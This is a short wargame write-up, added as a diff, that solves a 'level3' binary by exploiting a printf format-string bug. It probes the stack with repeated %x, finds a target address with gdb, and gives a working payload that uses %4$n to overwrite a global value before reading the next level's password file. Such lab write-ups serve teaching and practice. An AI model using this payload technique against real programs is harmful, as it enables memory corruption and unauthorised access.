@@ -1,0 +1,15 @@
+As we can see, there is a vulnerability in printf() function.
+by passing %x-.
+
+python -c 'print "%x-" * 10' | ./level3
+we can see that %x- is at the 4th position so i use gdb to find the address that we want to corrupt
+
+gdb level3
+(gdb) disas v
+	  0x080484da <+54>:	mov    0x804988c,%eax
+      0x080484df <+59>:	cmp    $0x40,%eax
+
+so our payload looks like this :
+	cat <(python -c 'print "\x08\x04\x98\x8c"[::-1] + "a" * 60 + "%4$n"') - | ./level3
+
+cd ../level4; cat .pass
